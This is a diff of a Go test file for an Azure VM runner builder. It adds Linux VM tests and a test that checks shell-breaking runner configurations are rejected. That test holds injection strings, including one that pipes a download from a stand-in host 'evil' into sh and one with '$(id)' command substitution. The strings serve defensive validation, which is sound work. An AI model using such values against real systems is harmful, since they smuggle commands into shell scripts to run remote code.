@@ -13,14 +13,21 @@ func testAzure() *AzureCloud {
 	return &AzureCloud{cfg: AzureConfig{
 		Location: "northcentralus", SubnetID: "/subscriptions/x/subnets/s", ImageID: "/subscriptions/x/images/windows-runner/versions/1.0.0",
 		VMSize: "Standard_B2als_v2", ResourceGroup: "rg",
+		LinuxImageID: "/subscriptions/x/images/linux-runner/versions/1.0.0", LinuxVMSize: "Standard_D2as_v5",
 	}}
 }
 
 func TestBuiltVMCarriesTheOwnershipTagsAndTheJitConfig(t *testing.T) {
 	spec := VMSpec{Name: "wr-1a2b3c4d", Repo: "o/widgets", Created: time.Date(2026, 11, 17, 12, 0, 0, 0, time.UTC), JITConfig: "the-jit-config"}
-	vm := testAzure().BuildVM(spec, "Pa55w0rd!")
+	vm, err := testAzure().BuildVM(spec, "Pa55w0rd!")
+	if err != nil {
+		t.Fatal(err)
+	}
 	if *vm.Tags[TagOwner] != TagOwnerVal || *vm.Tags[TagRepo] != "o/widgets" || *vm.Tags[TagCreated] != "2026-11-17T12:00:00Z" {
 		t.Errorf("tags = %v", vm.Tags)
+	}
+	if *vm.Tags[TagClass] != "windows" || vm.Properties.OSProfile.LinuxConfiguration != nil {
+		t.Error("a Windows spec must produce a Windows VM")
 	}
 	got, err := base64.StdEncoding.DecodeString(*vm.Properties.OSProfile.CustomData)
 	if err != nil || string(got) != "the-jit-config" {
@@ -35,7 +42,10 @@ func TestBuiltVMCarriesTheOwnershipTagsAndTheJitConfig(t *testing.T) {
 }
 
 func TestEverythingCreatedWithTheVMIsDeletedWithIt(t *testing.T) {
-	vm := testAzure().BuildVM(VMSpec{Name: "wr-1a2b3c4d", JITConfig: "x"}, "pw")
+	vm, err := testAzure().BuildVM(VMSpec{Name: "wr-1a2b3c4d", JITConfig: "x"}, "pw")
+	if err != nil {
+		t.Fatal(err)
+	}
 	if *vm.Properties.StorageProfile.OSDisk.DeleteOption != armcompute.DiskDeleteOptionTypesDelete {
 		t.Error("the OS disk would outlive the VM")
 	}
@@ -82,5 +92,53 @@ func TestPasswordsMeetWindowsComplexityAndDiffer(t *testing.T) {
 		if strings.ContainsAny(p, " \"'\\") {
 			t.Fatalf("password %q has a character that is awkward to pass on", p)
 		}
+	}
+}
+
+const sampleJIT = "eyJ0eXBlIjoiaml0IiwiY29uZmlnIjoiYWJjZGVmMDEyMzQ1Njc4OSJ9"
+
+func TestALinuxVMUsesTheLinuxImageSizeAndCloudInit(t *testing.T) {
+	spec := VMSpec{Name: "lr-1a2b3c4d", Repo: "o/widgets", Class: ClassLinux, Created: time.Unix(0, 0), JITConfig: sampleJIT}
+	vm, err := testAzure().BuildVM(spec, "pw")
+	if err != nil {
+		t.Fatal(err)
+	}
+	if *vm.Tags[TagClass] != "linux" || *vm.Tags[TagOwner] != TagOwnerVal {
+		t.Errorf("tags = %v", vm.Tags)
+	}
+	if *vm.Properties.StorageProfile.ImageReference.ID != testAzure().cfg.LinuxImageID {
+		t.Error("a Linux VM must be created from the Linux image")
+	}
+	if string(*vm.Properties.HardwareProfile.VMSize) != "Standard_D2as_v5" {
+		t.Errorf("size = %s", *vm.Properties.HardwareProfile.VMSize)
+	}
+	os := vm.Properties.OSProfile
+	if os.LinuxConfiguration == nil || os.WindowsConfiguration != nil {
+		t.Fatal("a Linux VM needs a Linux configuration and no Windows one")
+	}
+	script, _ := base64.StdEncoding.DecodeString(*os.CustomData)
+	for _, want := range []string{"#!/bin/bash", "cd /opt/actions-runner", "runuser -u runner", "--jitconfig '" + sampleJIT + "'"} {
+		if !strings.Contains(string(script), want) {
+			t.Errorf("user data is missing %q:\n%s", want, script)
+		}
+	}
+	nic := vm.Properties.NetworkProfile.NetworkInterfaceConfigurations[0]
+	if *nic.Properties.DeleteOption != armcompute.DeleteOptionsDelete || *vm.Properties.StorageProfile.OSDisk.DeleteOption != armcompute.DiskDeleteOptionTypesDelete {
+		t.Error("a Linux VM's NIC and disk must also be deleted with it")
+	}
+}
+
+func TestShellSyntaxInARunnerConfigIsRefused(t *testing.T) {
+	for _, bad := range []string{"x'; curl evil | sh; '", sampleJIT + "'$(id)'", "short", "has space " + sampleJIT, ""} {
+		if _, err := LinuxUserData(bad); err == nil {
+			t.Errorf("%q was accepted into a shell script", bad)
+		}
+		spec := VMSpec{Name: "lr-1a2b3c4d", Class: ClassLinux, JITConfig: bad}
+		if _, err := testAzure().BuildVM(spec, "pw"); err == nil {
+			t.Errorf("BuildVM accepted %q", bad)
+		}
+	}
+	if _, err := LinuxUserData(sampleJIT); err != nil {
+		t.Errorf("a real-looking configuration was refused: %v", err)
 	}
 }
